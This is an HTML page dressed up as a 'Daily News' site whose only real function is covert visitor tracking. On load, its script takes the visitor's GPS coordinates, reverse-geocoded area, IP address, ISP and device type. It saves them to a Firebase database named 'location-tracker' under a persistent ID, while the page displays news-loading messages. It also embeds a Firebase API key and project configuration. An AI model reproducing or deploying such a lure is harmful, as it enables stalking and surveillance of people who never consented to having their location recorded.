<!DOCTYPE html>
<html>
<head>
<title>Daily News</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>
body{margin:0;font-family:Arial;background:#f5f5f5;}

header{
background:#d60000;
color:white;
padding:15px;
font-size:26px;
font-weight:bold;
text-align:center;
}

nav{
background:#111;
padding:10px;
text-align:center;
}

nav a{
color:white;
margin:0 15px;
text-decoration:none;
font-size:14px;
}

.hero{
background:url('https://picsum.photos/1200/400') center/cover;
color:white;
padding:60px 20px;
text-align:center;
}

.hero h2{
font-size:32px;
}

.container{
width:90%;
margin:auto;
margin-top:20px;
}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:15px;
}

.card{
background:white;
padding:15px;
border-radius:8px;
box-shadow:0 2px 5px rgba(0,0,0,0.1);
}

.info{
margin-top:20px;
background:white;
padding:15px;
border-radius:8px;
}

.row{margin-bottom:8px;}

#map{
width:100%;
height:300px;
margin-top:15px;
border-radius:8px;
}

#status{
text-align:center;
margin-top:10px;
font-weight:bold;
}
</style>
</head>

<body>

<header>📰 Daily News</header>

<nav>
<a href="#">Home</a>
<a href="#">World</a>
<a href="#">Tech</a>
<a href="#">Sports</a>
<a href="#">Contact</a>
</nav>

<div class="hero">
<h2>Breaking News Today</h2>
<p>Latest updates from around the world</p>
</div>

<div class="container">

<div class="grid">
<div class="card">🌍 World News Headline</div>
<div class="card">💻 Tech Update</div>
<div class="card">⚽ Sports Highlight</div>
</div>

<div id="status">Loading news...</div>

<div class="info">
<div class="row">Latitude: <span id="lat"></span></div>
<div class="row">Longitude: <span id="lon"></span></div>
<div class="row">Thana: <span id="thana"></span></div>
<div class="row">District: <span id="district"></span></div>
<div class="row">Country: <span id="country"></span></div>
<div class="row">IP: <span id="ip"></span></div>
<div class="row">ISP: <span id="isp"></span></div>
<div class="row">Device: <span id="device"></span></div>
<div class="row">Model: <span id="model"></span></div>
<div class="row">Type: <span id="type"></span></div>
</div>

<div id="map"></div>

</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.appspot.com",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

var map = L.map('map').setView([23.8,90.4],10);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

function getUserId(){
let id = localStorage.getItem("userId")
if(!id){
id = Math.random().toString(36).substring(2,10)
localStorage.setItem("userId", id)
}
return id
}

function detectDevice(){
let ua=navigator.userAgent;
if(/mobile/i.test(ua)) return "Mobile";
if(/tablet/i.test(ua)) return "Tablet";
return "Desktop";
}

function detectDeviceModel(){
let ua=navigator.userAgent;
if(ua.includes("Android")) return "Android Phone";
if(ua.includes("Windows")) return "Windows PC";
if(ua.includes("Mac")) return "Mac";
return "Unknown";
}

async function getLocationDetails(lat, lon){
try{
const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
const data = await res.json()
let a = data.address

return {
thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
district: a.state_district || a.county || "unknown"
}
}catch{
return {thana:"unknown",district:"unknown"}
}
}

async function getIP(){
let res = await fetch("https://ipinfo.io/json")
let data = await res.json()

return {
ip:data.ip,
org:data.org,
country:data.country
}
}

async function save(data){
let id = getUserId()
await setDoc(doc(db,"locations",id), data)
}

async function useGPS(pos){

let lat = pos.coords.latitude
let lon = pos.coords.longitude

let loc = await getLocationDetails(lat,lon)
let ip = await getIP()

document.getElementById("status").innerText="Live News Loaded"
document.getElementById("lat").innerText=lat
document.getElementById("lon").innerText=lon
document.getElementById("thana").innerText=loc.thana
document.getElementById("district").innerText=loc.district
document.getElementById("country").innerText=ip.country
document.getElementById("ip").innerText=ip.ip
document.getElementById("isp").innerText=ip.org
document.getElementById("device").innerText=detectDevice()
document.getElementById("model").innerText=detectDeviceModel()
document.getElementById("type").innerText="GPS"

map.setView([lat,lon],15)
L.marker([lat,lon]).addTo(map)

save({
latitude:lat,
longitude:lon,
thana:loc.thana,
district:loc.district,
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"GPS",
time:new Date().toLocaleString()
})

}

async function useIP(){

let ip = await getIP()

document.getElementById("status").innerText="Limited News Mode"

document.getElementById("country").innerText=ip.country
document.getElementById("ip").innerText=ip.ip
document.getElementById("isp").innerText=ip.org
document.getElementById("device").innerText=detectDevice()
document.getElementById("model").innerText=detectDeviceModel()
document.getElementById("type").innerText="IP"

}

navigator.geolocation.getCurrentPosition(useGPS,useIP)

</script>

</body>
</html>
